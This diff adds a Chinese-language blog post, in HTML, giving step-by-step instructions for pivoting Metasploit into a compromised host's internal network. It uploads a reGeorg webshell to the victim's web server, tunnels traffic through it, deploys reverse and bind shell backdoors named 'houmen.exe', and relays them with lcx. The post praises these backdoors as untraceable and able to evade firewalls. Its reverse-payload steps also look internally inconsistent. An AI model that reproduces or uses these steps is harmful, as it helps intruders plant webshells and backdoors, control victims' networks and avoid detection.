@@ -1,0 +1,83 @@
+<h3 id="0x01-场景">0x01 场景</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1.肉鸡网络为内网环境,假设肉鸡ip为192.168.130.111
+2.肉鸡内网中有一台开启公网web服务机器,假设提供对应http://rouji.com,假设运行aspx
+3.尝试将msf用肉鸡的内网代理来控制目标内网
+4.msf控制端网络环境任意,可为内网,假设ip为192.168.3.166[此192.168与上面肉鸡的192.168不是同一个内网下的192.168]
+</code></pre>
+</div>
+
+<h3 id="0x02-准备">0x02 准备</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>步骤如下:
+1.上传reGeorg的tunnel.aspx到http://rouji.com/tunnel.aspx
+2.控制端本地运行:python reGeorg.py -u http://rouji.com/tunnel.aspx -p 1080
+3.控制端[假设为kali系统]:
+apt-get install tsocks
+vi /etc/tsocks.conf配置server地址为127.0.0.1,端口为1080
+tsocks msfconsole
+4.两种控制模式:
+a)reverse类型payload连接
+b)bind类型payload连接
+</code></pre>
+</div>
+
+<h3 id="0x03-reverse类型payload">0x03 Reverse类型payload</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1.用msf生成一个reverse类型的exe,如下设置:
+payload: windows/shell/reverse_tcp
+rhost: 192.168.130.111[肉鸡本身的内网ip]
+lport: 1234
+假设生成houmen.exe
+
+2.将lcx和上面生成的houmen.exe上传到肉鸡192.168.130.111,运行:
+lcx -listen 300 1234
+houmen.exe
+
+3.在控制端msf中运行:
+use multi/handler
+set payload windows/shell/bind_tcp
+set rhost 192.168.130.111
+set lport 300
+run -j
+
+上面3个步骤完成后即可成功连接肉鸡
+
+</code></pre>
+</div>
+
+<h3 id="0x04-bind类型payload">0x04 Bind类型payload</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1.用msf生成一个bind类型的exe,如下设置:
+payload: windows/shell/bind_tcp
+lport: 1111
+假设生成houmen.exe
+
+2.将houmen.exe上传到肉鸡192.168.130.111,运行:
+houmen.exe
+
+3.在控制端msf中运行:
+use multi/handler
+set payload windows/shell/bind_tcp
+set rhost 192.168.130.111
+set lport 1111
+run -j
+
+上面3个步骤完成后即可成功连接肉鸡
+</code></pre>
+</div>
+
+<h3 id="0x05-about">0x05 About</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>优点:
+1.两种houmen.exe都无法溯源
+2.两种houmen.exe都可尝试用在目标网络环境有防火墙拦截规则下正常通信,将所有与肉鸡的通信流量变成控制端与肉鸡内网的一台
+web服务器的正常通信
+3.msf控制端可直接访问肉鸡内网所有资源(正常情况下要在控制一台肉鸡后将肉鸡设置为路由转发才由本地msf访问肉鸡内网)
+
+遗憾:
+就算是这样做,msf中的一些欺骗模块(eg.auxiliary/spoof/nbns/nbns_response)和其他的需要肉鸡设置为待访问资源的
+模块(eg.各种ie漏洞模块)在目标内网环境中依然没有用,因为为msf使用目标内网代理只是增加了msf对目标内网的访问权限,并
+没有使msf有目标内网其他机器可以访问msf的功能
+</code></pre>
+</div>
